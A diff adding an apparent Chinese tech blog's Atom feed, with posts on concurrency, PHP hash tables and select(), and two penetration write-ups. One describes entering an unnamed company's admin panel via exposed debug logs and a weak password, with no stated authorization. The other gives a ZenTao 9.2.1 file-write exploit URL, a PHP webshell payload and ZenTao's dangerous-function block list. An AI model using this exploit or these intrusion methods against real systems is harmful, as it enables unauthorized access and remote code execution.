@@ -1,0 +1,318 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>hooklife&#39;s blog</title>
+  
+  <subtitle>这个世界会好么？</subtitle>
+  <link href="/atom.xml" rel="self"/>
+  
+  <link href="https://hooklife.me/"/>
+  <updated>2020-04-14T03:59:02.087Z</updated>
+  <id>https://hooklife.me/</id>
+  
+  <author>
+    <name>hooklife</name>
+    
+  </author>
+  
+  <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>进程、协程、线程</title>
+    <link href="https://hooklife.me/uncategorized/%E8%BF%9B%E7%A8%8B%E3%80%81%E5%8D%8F%E7%A8%8B%E3%80%81%E7%BA%BF%E7%A8%8B/"/>
+    <id>https://hooklife.me/uncategorized/进程、协程、线程/</id>
+    <published>2020-04-14T03:46:10.000Z</published>
+    <updated>2020-04-14T03:59:02.087Z</updated>
+    
+    <content type="html"><![CDATA[<p>首先需要了解两个概念，并发与并行</p><h2 id="并发-Concurreny-与-并行-Parallelism"><a href="#并发-Concurreny-与-并行-Parallelism" class="headerlink" title="并发 (Concurreny) 与 并行 (Parallelism)"></a>并发 (Concurreny) 与 并行 (Parallelism)</h2><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/process_thread_coroutine/cbu0a-yilrd.jpg" alt="cbu0a-yilrd" title>                </div>                <div class="image-caption">cbu0a-yilrd</div>            </figure><h3 id="并发"><a href="#并发" class="headerlink" title="并发"></a>并发</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">并发 = ⼩小明可以⼀边玩⼿手机⼀边看电视。</span><br></pre></td></tr></table></figure><p>事实上，⼩小明的眼睛在看电视的时候并不能看⼿手机，他在看手机的时候也没办法盯着电视屏幕。<br>他的眼睛⻜快的在两个屏幕上切换<br><strong>这不是真正意义上的同时进行，但⼜是客观存在同时进行两件事，这叫并发。</strong></p><h3 id="并行"><a href="#并行" class="headerlink" title="并行"></a>并行</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">并行 = ⼩明可以⼀边坐公交⼀边听音乐。</span><br></pre></td></tr></table></figure><p>这两件事互不干扰，⼩明可以做到真正意义的同步同时进行，这叫并行</p><h2 id="进程、线程和协程之间的区别"><a href="#进程、线程和协程之间的区别" class="headerlink" title="进程、线程和协程之间的区别"></a>进程、线程和协程之间的区别</h2><p>###进程(<strong>Process</strong>)</p><p><strong>进程让操作系统的并发成为了可能</strong>，它是资源分配的<strong>最小单位</strong> 。每个进程来对应一定的内存空间，并<br>且只能使⽤它⾃⼰的内存空间，各个进程之间互不干扰。进程同时也保存了了程序每个时刻的运行状态，<br>为 <strong>进程切换</strong> 提供了可能。当进程暂停时，它会保存当前进程的状态(进程标识，进程使⽤用的资源<br>等)，在下一次切换回来时根据之前保存的状态进行恢复，接着继续执行。</p><h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><ul><li>进程之间不共享任何状态</li><li>进程的调度由操作系统完成</li><li><p>每个进程都有自⼰独⽴的内存空间</p></li><li><p>由于进程⽐较重量，占据独立的内存，所以创建、销毁和上下⽂进程间的切换开销(栈、寄存器、 ⽂件句柄等)⽐较⼤。</p></li><li>由于进程间之间互不不干扰,各⾃拥有自⼰的内存空间, 因此相对于线程比较安全, 所以不同进程之间的数据只能通过 <strong>IPC</strong>(Inter-Process Communication) 进行通信共享，通讯效率比较低。 </li></ul><h3 id="线程-Thread"><a href="#线程-Thread" class="headerlink" title="线程 (Thread)"></a>线程 (<strong>Thread</strong>)</h3><p>每个进程⾄至少有一个线程。线程是依赖于进程的，是操作系统能够进⾏<strong>运算调度</strong>的最小单位。也称为 「微进程」 。<strong>线程的出现是为了降低上下文切换的消耗，提⾼系统的并发性，并突破⼀个进程只能⼲一 样事的缺陷，使到进程内并发成为可能</strong>。 </p><p><strong>进程让操作系统的并发性成为了可能，⽽线程让进程的内部并发成为了可能</strong>。 </p><h4 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h4><ul><li><p>⼀个进程可以包含多个线程，但是这些线程共享进程占有的内存地址空间和资源。线程之间共享变量，解决了了通讯麻烦的问题</p></li><li><p>线程能够共享进程的⼤部分资源，创建、销毁和上下文切换开销比较小。 线程之间的通讯除了了可以使用进程之间通讯的⽅式以外还可以通过共享内存的⽅式进行通信，通讯效率较高</p></li><li>多线程是不安全的,当一个线程崩溃了了,会导致整个进程也崩溃了,即其他线程也挂了, 但多进程⽽不 会,一个进程挂了了,另⼀个进程依然照样运行。</li></ul><h3 id="协程-Coroutine"><a href="#协程-Coroutine" class="headerlink" title="协程 (Coroutine)"></a>协程 (<strong>Coroutine</strong>)</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p><strong>协程是一种⽤户态的轻量级线程</strong>，它的<strong>调度不来⾃于系统</strong>，⽽是<strong>完全来自于⽤用户控制</strong>。协程拥有⾃己的寄存器上下文和栈。协程调度切换时，将寄存器上下文和栈保存到其 他地方，在切回来的时候，恢复先前保存的寄存器器上下文和栈，直接操作栈则基本没有内核切换的开销，所以上下文的切换非常快。不不过协程本身⽆法利用多核CPU，因为它基于线程，⽽线程⼜依赖于进程。</p><h4 id="特点-2"><a href="#特点-2" class="headerlink" title="特点"></a>特点</h4><ul><li>协程的调度完全由⽤用户控制</li><li>本身无法利用多核CPU</li><li>可并发执行</li><li>更好的利用CPU，不用把CPU浪费在线程调度和上下文切换上</li><li>协程可以更好的利用内存，不用全都分配⼀个偏大的空间，只需要分配需要的对应空间即可</li><li>协程需要保证程序是⾮堵塞。</li><li>切换开销远比线程小。</li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>　　对于 <strong>进程、线程</strong>，都是有内核进行调度，有 [<strong>CPU 时间片</strong>][CPU 时间片] 的概念。</p><p>　　对于 <strong>协程</strong>(用户级线程)，这是对内核透明的，也就是系统并不知道有协程的存在，是完全由用户自己的程序进行调度的，因为是由用户程序自己控制，那么就很难像抢占式调度那样做到强制的 CPU 控制权切换到其他进程/线程，通常只能进行 <strong>协作式调度</strong>，需要协程自己主动把控制权转让出去之后，其他协程才能被执行到。</p><h4 id="CPU-时间片"><a href="#CPU-时间片" class="headerlink" title="CPU 时间片"></a>CPU 时间片</h4><p>任何线程如果都排队等待CPU资源的获取，那么所谓的 多线程/多进程 就没有任何实际意义。</p><p><strong>时间片即 CPU 分配给各个程序的时间</strong>，在 Linux 的内核处理过程中，每一个进程/线程默认会有一个固定的时间片来执行命令（默认为1/100秒），每个 进程/线程 被分配一个时间段执行，使各个程序从表面上看是同时进行的。如果在时间片结束时进程还在运行，则CPU将被剥夺并分配给另一个进程。如果进程在时间片结束前阻塞或结束，则CPU当即进行切换。而不会造成CPU资源浪费。由于只有一个CPU，一次只能处理程序要求的一部分，如何处理公平，一种方法就是引入时间片，每个程序轮流执行。</p><p><img src="/img/process_thread_coroutine/Timeslice.jpg" alt="Timeslice"></p><h4 id="进程-与-线程-在-linux-中的区别"><a href="#进程-与-线程-在-linux-中的区别" class="headerlink" title="进程 与 线程 在 linux 中的区别"></a>进程 与 线程 在 linux 中的区别</h4><p>进程和线程其实在 linux 中区别并不大，具体内容可以查看<a href="https://juejin.im/entry/56daf0047664bf0052f0bdbd" target="_blank" rel="noopener">这篇文章</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;首先需要了解两个概念，并发与并行&lt;/p&gt;
+&lt;h2 id=&quot;并发-Concurreny-与-并行-Parallelism&quot;&gt;&lt;a href=&quot;#并发-Concurreny-与-并行-Parallelism&quot; class=&quot;headerlink&quot; title=&quot;并发 (Conc
+      
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>数组的底层实现：HashTable</title>
+    <link href="https://hooklife.me/uncategorized/%E6%95%B0%E7%BB%84%E7%9A%84%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0%EF%BC%9AHashTable.mdq/"/>
+    <id>https://hooklife.me/uncategorized/数组的底层实现：HashTable.mdq/</id>
+    <published>2019-09-09T02:59:40.000Z</published>
+    <updated>2020-04-14T03:59:02.086Z</updated>
+    
+    <content type="html"><![CDATA[<p>PHP 中的数组是一种强大且灵活的数据类型。</p><h2 id="哈希-Hash"><a href="#哈希-Hash" class="headerlink" title="哈希 (Hash)"></a>哈希 (Hash)</h2><blockquote><p><strong>Hash</strong>，一般翻译做”散列”，也有直接音译为”哈希”的，就是把任意长度的输入（又叫做预映射， pre-image），通过散列算法，变换成固定长度的输出，该输出就是散列值。这种转换是一种压缩映射，也就是散列值的空间通常远小于输入的空间，不同的输入可能会散列成相同的输出，而不可能从散列值来唯一的确定输入值。简单的说就是一种将任意长度的消息压缩到某一固定长度的消息摘要的函数。</p></blockquote><h2 id="哈希表-Hash-table"><a href="#哈希表-Hash-table" class="headerlink" title="哈希表 (Hash table)"></a>哈希表 (Hash table)</h2><blockquote><p><strong>散列表</strong>（<strong>Hash table</strong>，也叫<strong>哈希表</strong>），是根据键（Key）而直接访问在内存存储位置的数据结构。也就是说，它通过计算一个关于键值的函数，将所需查询的数据映射到表中一个位置来访问记录，这加快了查找速度。 这个映射函数称做散列函数，存放记录的数组称做散列表</p></blockquote><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;PHP 中的数组是一种强大且灵活的数据类型。&lt;/p&gt;
+&lt;h2 id=&quot;哈希-Hash&quot;&gt;&lt;a href=&quot;#哈希-Hash&quot; class=&quot;headerlink&quot; title=&quot;哈希 (Hash)&quot;&gt;&lt;/a&gt;哈希 (Hash)&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;&lt;st
+      
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>同步 I/O 多路复用之 select</title>
+    <link href="https://hooklife.me/linux/SELECT%E3%80%81POLL%E5%92%8CEPOLL/"/>
+    <id>https://hooklife.me/linux/SELECT、POLL和EPOLL/</id>
+    <published>2019-03-12T11:33:32.000Z</published>
+    <updated>2020-04-14T03:59:02.085Z</updated>
+    
+    <content type="html"><![CDATA[<p><code>select()</code>  赋予你同时监控多个 sockets 的能力，他会告诉你哪些 sockets 可以读取，哪些可以写入，哪些触发了异常。</p><a id="more"></a><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">select</span><span class="params">(<span class="keyword">int</span> nfds,fd_set *readfds,fd_set *writeset,fd_set *exceptset,<span class="keyword">const</span> struct timeval *timeout)</span></span></span><br></pre></td></tr></table></figure><h3 id="nfds"><a href="#nfds" class="headerlink" title="nfds"></a>nfds</h3><p>nfds 是所有加入集合的句柄值的最大那个值还要加1</p><p>比如我们创建了3个句柄：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> sa, sb, sc;</span><br><span class="line">sa = socket(...); <span class="comment">/* 分别创建3个句柄并连接到服务器上 */</span></span><br><span class="line">connect(sa,...);</span><br><span class="line">sb = socket(...);</span><br><span class="line">connect(sb,...);</span><br><span class="line">sc = socket(...);</span><br><span class="line">connect(sc,...);</span><br><span class="line">FD_SET(sa, &amp;rdfds);<span class="comment">/* 分别把3个句柄加入读监视集合里去 */</span></span><br><span class="line">FD_SET(sb, &amp;rdfds);</span><br><span class="line">FD_SET(sc, &amp;rdfds);</span><br></pre></td></tr></table></figure><p>在使用 select 函数之前，一定要找到3个句柄中的最大值是哪个，我们一般定义一个变量来保存最大值，取得最大 socket 值如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> nfds = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(sa &gt; maxfd)</span><br><span class="line">nfds = sa;</span><br><span class="line"><span class="keyword">if</span>(sb &gt; maxfd)</span><br><span class="line">nfds = sb;</span><br><span class="line"><span class="keyword">if</span>(sc &gt; maxfd)</span><br><span class="line">nfds = sc;</span><br><span class="line">ret = select(maxfd + <span class="number">1</span>,...);</span><br></pre></td></tr></table></figure><h4 id="为什么-1？"><a href="#为什么-1？" class="headerlink" title="为什么 +1？"></a>为什么 +1？</h4><p><a href="http://pubs.opengroup.org/onlinepubs/9699919799/functions/pselect.html" target="_blank" rel="noopener">标准</a>上说：</p><blockquote><p>nfds 参数是指定要测试的描述符范围。第一个描述符每次都会被检查，也就是说，从0到 nfds - 1 的描述符会被检查。</p></blockquote><p><code>nfds</code> 需要的不是文件描述符数量，而是 watch 范围的上限。<a href="https://stackoverflow.com/questions/12025133/select-from-multiply-sockets-right-nfds-value?rq=1" target="_blank" rel="noopener">3</a></p><h4 id="为什么是最大的句柄？"><a href="#为什么是最大的句柄？" class="headerlink" title="为什么是最大的句柄？"></a>为什么是最大的句柄？</h4><p>在  <a href="http://www.apuebook.com/" target="_blank" rel="noopener">“Advanced Programming in the UNIX Environment”</a> 中 W. Richard Stevens 说这是为了性能优化。</p><h4 id="设置-nfds-为0？"><a href="#设置-nfds-为0？" class="headerlink" title="设置 nfds 为0？"></a>设置 nfds 为0？</h4><p><a href="http://linux.die.net/man/2/select" target="_blank" rel="noopener">man page</a> 讲到</p><blockquote><p>一些代码中调用 <code>select()</code> 三个 <code>set</code> 都设置为空，nfds 为 0，和一个非空的 timeout，用来实现一个可移植的亚秒级别的 sleep</p></blockquote><p>在 <code>nanosleep</code> 广泛支持前，<code>select</code> 是唯一可移植实现亚秒 sleep 的方法。<a href="https://stackoverflow.com/questions/16767845/what-does-select-do-when-nfds-is-0" target="_blank" rel="noopener">4</a></p><h3 id="readset，writeset，exceptset"><a href="#readset，writeset，exceptset" class="headerlink" title="readset，writeset，exceptset"></a>readset，writeset，exceptset</h3><p>这三个参数都是 <code>fd_set *</code> 类型。</p><p>即我们在程序里要申明几个 <code>fd_set</code> 类型的变量，比如 <code>rdfds</code>, <code>wtfds</code>, <code>exfds</code>，然后把这个变量的地址 <code>&amp;rdfds</code>, <code>&amp;wtfds</code>, <code>&amp;exfds</code> 传递给 <code>select</code> 函数。</p><ul><li>readset：当句柄的状态变成可读的时系统就会告诉 <code>select</code> 函数返回</li><li>writeset：句柄状态变成可写的时系统就会告诉<code>select</code> 函数返回</li><li>exceptset：特殊情况，即句柄上有特殊情况发生时系统会告诉 select函数返回。特殊情况比如对方通过一个socket句柄发来了紧急数据。</li></ul><p><code>fd_set</code> 可以理解为一个集合，这个集合中放的是文件描述符，可以通过以下的宏进行设置：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FD_ZERO</span><span class="params">(fd_set *fdset)</span></span>;          <span class="comment">//清空集合</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FD_SET</span><span class="params">(<span class="keyword">int</span> fd, fd_set *fdset)</span></span>;   <span class="comment">//将一个给定的文件描述符加入集合之中</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FD_CLR</span><span class="params">(<span class="keyword">int</span> fd, fd_set *fdset)</span></span>;   <span class="comment">//将一个给定的文件描述符从集合中删除</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">FD_ISSET</span><span class="params">(<span class="keyword">int</span> fd, fd_set *fdset)</span></span>;  <span class="comment">// 检查集合中指定的文件描述符是否可以读写</span></span><br></pre></td></tr></table></figure><p>一个常见的用法：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FD_ZERO(&amp;readset);</span><br><span class="line">FD_SET(fd,&amp;readset);</span><br><span class="line">select(fd+<span class="number">1</span>,&amp;readset,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span>(FD_ISSET(fd,readset)&#123;……&#125;</span><br></pre></td></tr></table></figure></p><h3 id="timeval"><a href="#timeval" class="headerlink" title="timeval"></a>timeval</h3><p>timeout为结构timeval，用来设置 <code>select()</code> 的等待时间，其结构定义如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> &#123;</span></span><br><span class="line">    <span class="keyword">long</span> tv_sec;   <span class="comment">//seconds</span></span><br><span class="line">    <span class="keyword">long</span> tv_usec;  <span class="comment">//microseconds</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这个参数有三种可能</p><ol><li>永远等待下去：仅在有一个描述字准备好I/O时才返回。为此，把该参数设置为空指针 <code>NULL</code>。</li><li>等待一段固定时间：在有一个描述字准备好I/O时返回，但是不超过由该参数所指向的 timeval 结构中指定的秒数和微秒数。</li><li>根本不等待：检查描述字后立即返回，这称为轮询。为此，该参数必须指向一个 timeval 结构，而且其中的定时器值必须为0。</li></ol><h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><p>执行成功则返回文件描述词状态已改变的个数，如果返回0代表在描述词状态改变前已超过 timeout 时间，当有错误发生时则返回-1，错误原因存于 errno，此时参数 <code>readfds</code>，<code>writefds</code>，<code>exceptfds</code> 和 timeout 的值变成不可预测</p><h2 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h2><p>目前几乎在支持所有平台，有良好的跨平台性。</p><h2 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h2><ul><li>每次调用 <code>select</code>，都需要把文件描述符集合从用户态拷贝到内核态，这个开销在fd很多时会很大</li><li>单个进程能监视的描述符存在最大限制，在 Linux 一般为1024，只能通过重新编译内核等复杂方式改变。</li><li>通过在内核遍历文件描述符来获取已经就绪的 socket。事实上，同时连接的大量客户端在一时刻可能只有很少的处于就绪状态，因此随着监视的描述符数量的增长，其效率也会线性下降。</li></ul><h2 id="下面是linux环境下select的一个简单用法"><a href="#下面是linux环境下select的一个简单用法" class="headerlink" title="下面是linux环境下select的一个简单用法"></a>下面是linux环境下select的一个简单用法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">** select.c -- a select() demo</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STDIN 0 <span class="comment">// standard input 的 file descriptor</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">tv</span>;</span></span><br><span class="line">    fd_set readfds;</span><br><span class="line"></span><br><span class="line">    tv.tv_sec = <span class="number">5</span>;</span><br><span class="line">    tv.tv_usec = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    FD_ZERO(&amp;readfds);</span><br><span class="line">    FD_SET(STDIN, &amp;readfds);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 不用管 writefds 與 exceptfds：</span></span><br><span class="line">    select(STDIN + <span class="number">1</span>, &amp;readfds, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;tv);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (FD_ISSET(STDIN, &amp;readfds)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"A key was pressed!\n"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Time out.\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考资料：</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;code&gt;select()&lt;/code&gt;  赋予你同时监控多个 sockets 的能力，他会告诉你哪些 sockets 可以读取，哪些可以写入，哪些触发了异常。&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="linux" scheme="https://hooklife.me/categories/linux/"/>
+    
+    
+      <category term="linux" scheme="https://hooklife.me/tags/linux/"/>
+    
+      <category term="C++" scheme="https://hooklife.me/tags/C/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>某企业官网的一次渗透</title>
+    <link href="https://hooklife.me/%E5%AE%89%E5%85%A8/%E6%9F%90%E4%BC%81%E4%B8%9A%E5%AE%98%E7%BD%91%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/"/>
+    <id>https://hooklife.me/安全/某企业官网的一次渗透/</id>
+    <published>2018-09-09T05:00:12.000Z</published>
+    <updated>2020-04-14T03:59:02.087Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="信息获取"><a href="#信息获取" class="headerlink" title="信息获取"></a>信息获取</h1><h2 id="确认程序使用语言-框架"><a href="#确认程序使用语言-框架" class="headerlink" title="确认程序使用语言/框架"></a>确认程序使用语言/框架</h2><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/2018-09-09/1.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><p>通过请求的 X-Powered-By 头和 URL 的来看,猜测网站环境为:php + apache并使用 thinkphp 框架进行开发</p><h1 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h1><h2 id="尝试使用-SQL-注入"><a href="#尝试使用-SQL-注入" class="headerlink" title="尝试使用 SQL 注入"></a>尝试使用 SQL 注入</h2><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/2018-09-09/2.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><p>尝试多个传参地址进行手动盲注，都失败，因为使用了框架的原因，可能过滤了大多数比较低级的注入</p><h2 id="尝试-XSS-打后台"><a href="#尝试-XSS-打后台" class="headerlink" title="尝试 XSS 打后台"></a>尝试 XSS 打后台</h2><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/2018-09-09/3.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><p>无奈发现网站中所有表单竟然都不能真实提交</p><h2 id="尝试历史-thinkphp-漏洞"><a href="#尝试历史-thinkphp-漏洞" class="headerlink" title="尝试历史 thinkphp 漏洞"></a>尝试历史 thinkphp 漏洞</h2><p>基本没有能利用到这个网站中的，不知道是thinkphp的版本问题还是…</p><h1 id="换种思路"><a href="#换种思路" class="headerlink" title="换种思路"></a>换种思路</h1><h2 id="根据-thinkphp-默认路径尝试获取日志"><a href="#根据-thinkphp-默认路径尝试获取日志" class="headerlink" title="根据 thinkphp 默认路径尝试获取日志"></a>根据 thinkphp 默认路径尝试获取日志</h2><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/2018-09-09/4.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><p>发现网站竟然忘记关掉 debug !!!!!!,所有的SQL语句都暴漏了</p><p>根据猜测得知后端日志地址为 URL/Runtime/Logs/Manage/18_09_09.log</p><p>翻了翻,暂时没发现什么有用的东西</p><p>尝试写脚本爬取所有日志，一点一点筛查，发现并没有改密码的SQL</p><h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><p>在日志中发现了几个登陆的用户名，经过简单尝试发现，其中一个账号的密码竟然是简单的 admin</p><p>真是白费了这么多功夫</p><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/2018-09-09/5.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><p>成功拿到后台,点到为止,也没有继续进行 getshell 什么的</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol><li>上线千万别忘记关闭 debug</li><li>thinkphp 的程序建议简单修改程序,把index.php 移入 Public 文件夹中</li><li>加强密码管理,不要存在这么简单的密码</li><li>日志目录不要给可访问权限</li><li>尽量不要暴漏程序使用的语言/框架</li></ol>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;信息获取&quot;&gt;&lt;a href=&quot;#信息获取&quot; class=&quot;headerlink&quot; title=&quot;信息获取&quot;&gt;&lt;/a&gt;信息获取&lt;/h1&gt;&lt;h2 id=&quot;确认程序使用语言-框架&quot;&gt;&lt;a href=&quot;#确认程序使用语言-框架&quot; class=&quot;headerlink&quot; ti
+      
+    
+    </summary>
+    
+      <category term="安全" scheme="https://hooklife.me/categories/%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="渗透" scheme="https://hooklife.me/tags/%E6%B8%97%E9%80%8F/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>记一次禅道渗透并获取webshell</title>
+    <link href="https://hooklife.me/%E5%AE%89%E5%85%A8/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%85%E9%81%93%E6%B8%97%E9%80%8F/"/>
+    <id>https://hooklife.me/安全/记一次禅道渗透/</id>
+    <published>2018-03-12T09:33:32.000Z</published>
+    <updated>2020-04-14T03:59:02.087Z</updated>
+    
+    <content type="html"><![CDATA[<p>有登陆权限,对 9.2.1 版本禅道渗透,获取webshell<br><a id="more"></a></p><h1 id="确认版本"><a href="#确认版本" class="headerlink" title="确认版本"></a>确认版本</h1><p>首先通过接口获取禅道版本<br><a href="http://127.0.0.1/index.php?mode=getconfig" target="_blank" rel="noopener">http://127.0.0.1/index.php?mode=getconfig</a><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"version"</span>: <span class="string">"9.2.1"</span>,</span><br><span class="line">  <span class="string">"requestType"</span>: <span class="string">"PATH_INFO"</span>,</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL:http://127.0.0.1/?m=api&amp;f=getModel&amp;moduleName=editor&amp;methodName=save&amp;params=filePath=a.php</span><br><span class="line">Method:POST</span><br><span class="line">Payload:fileContent=&lt;?php $_POST[1]($_POST[2]);</span><br></pre></td></tr></table></figure><p>直接提交发现报错:<br> 无法写入，可能没有权限。请尝试执行 chmod 777 -R a.ph  具体什么原因我也不太清楚</p><p>查看源代码 module/editor/model.php 371行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">($filePath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $fileContent = <span class="keyword">$this</span>-&gt;post-&gt;fileContent;</span><br><span class="line">    $evils       = <span class="keyword">array</span>(<span class="string">'eval'</span>, <span class="string">'exec'</span>, <span class="string">'passthru'</span>, <span class="string">'proc_open'</span>, <span class="string">'shell_exec'</span>, <span class="string">'system'</span>, <span class="string">'$$'</span>, <span class="string">'include'</span>, <span class="string">'require'</span>, <span class="string">'assert'</span>);</span><br><span class="line">    $gibbedEvils = <span class="keyword">array</span>(<span class="string">'e v a l'</span>, <span class="string">'e x e c'</span>, <span class="string">' p a s s t h r u'</span>, <span class="string">' p r o c _ o p e n'</span>, <span 